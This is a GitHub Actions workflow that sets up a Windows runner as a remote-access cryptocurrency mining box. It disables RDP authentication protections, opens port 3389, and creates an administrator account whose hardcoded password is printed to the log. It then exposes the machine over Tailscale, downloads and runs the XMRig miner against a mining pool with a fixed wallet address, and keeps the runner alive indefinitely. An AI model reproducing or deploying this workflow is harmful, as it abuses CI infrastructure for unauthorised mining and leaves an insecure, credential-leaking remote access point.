name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          # Enable Remote Desktop and disable Network Level Authentication (if needed)
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          # Remove any existing rule with the same name to avoid duplication
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          
          # For testing, allow any incoming connection on port 3389
          netsh advfirewall firewall add rule name="RDP-Tailscale" `
            dir=in action=allow protocol=TCP localport=3389

          # (Optional) Restart the Remote Desktop service to ensure changes take effect
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Secure Password
        run: |
          # Set a complex password that meets Windows complexity requirements
          $password = "P@ssw0rd12345678"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          
          # Output the actual password used
          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
          
          if (-not (Get-LocalUser -Name "RDP")) {
              Write-Error "User creation failed"
              exit 1
          }

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          # Bring up Tailscale with the provided auth key and set a unique hostname
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
          
          # Wait for Tailscale to assign an IP
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          
          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
      
      - name: Verify RDP Accessibility
        run: |
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          
          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"

      - name: Download and Extract XMRig
        run: |
          $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
          $desktopPath = "C:\Users\RDP\Desktop"
          $zipPath = Join-Path $desktopPath "xmrig-6.24.0-windows-x64.zip"
          $extractPath = Join-Path $desktopPath "xmrig"
          
          # Ensure the directory exists
          if (-not (Test-Path $desktopPath)) {
              New-Item -ItemType Directory -Path $desktopPath -Force
          }
          
          # Download the zip file
          Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
          
          # Extract the zip file
          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
          
          # Clean up the zip file
          Remove-Item $zipPath -Force
          
          Write-Host "XMRig extracted to: $extractPath"

      - name: Generate Random Worker Name
        run: |
          # Generate a random worker name
          $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
          $workerName = "unmineable_worker_" + (-join ((1..10) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] }))
          echo "WORKER_NAME=$workerName" >> $env:GITHUB_ENV
          Write-Host "Generated worker name: $workerName"

      - name: Run XMRig
        run: |
          $desktopPath = "C:\Users\RDP\Desktop"
          $extractPath = Join-Path $desktopPath "xmrig"
          $xmrigPath = Join-Path $extractPath "xmrig-6.24.0"
          $xmrigExe = Join-Path $xmrigPath "xmrig.exe"
          
          # Create a batch file to run xmrig
          $batchContent = @"
          cd "$xmrigPath"
          "$xmrigExe" -a rx -o stratum+ssl://rx.unmineable.com:443 -u ETH:0x28aE9c6650C8822B7e232d7f6649D8a7c6879718.$env:WORKER_NAME -p x
          pause
          "@
          
          $batchPath = Join-Path $extractPath "run_xmrig.bat"
          $batchContent | Out-File -FilePath $batchPath -Encoding ASCII
          
          # Execute the batch file
          Start-Process -FilePath $batchPath -WorkingDirectory $xmrigPath

      - name: Maintain Connection
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $(echo $env:RDP_CREDS)"
          Write-Host "==================`n"
          
          # Keep runner active indefinitely (or until manually cancelled)
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
